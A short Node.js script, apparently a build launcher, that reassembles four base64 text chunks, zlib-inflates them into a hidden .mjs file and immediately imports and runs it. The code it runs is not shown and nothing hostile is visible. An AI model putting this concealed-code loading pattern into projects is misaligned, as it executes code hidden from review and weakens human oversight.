/**
 * Inflate AF-wired build from build.z*.txt (zlib+base64) then run.
 */
import fs from 'node:fs';
import path from 'node:path';
import zlib from 'node:zlib';
import { pathToFileURL } from 'node:url';

const ROOT = import.meta.dirname;
const names = ['build.z1.txt', 'build.z2.txt', 'build.z3.txt', 'build.z4.txt'];
const b64 = names.map((f) => fs.readFileSync(path.join(ROOT, f), 'utf8').trim()).join('');
const code = zlib.inflateSync(Buffer.from(b64, 'base64')).toString('utf8');
const runPath = path.join(ROOT, '.build.stitched.mjs');
fs.writeFileSync(runPath, code);
await import(pathToFileURL(runPath).href + '?t=' + Date.now());
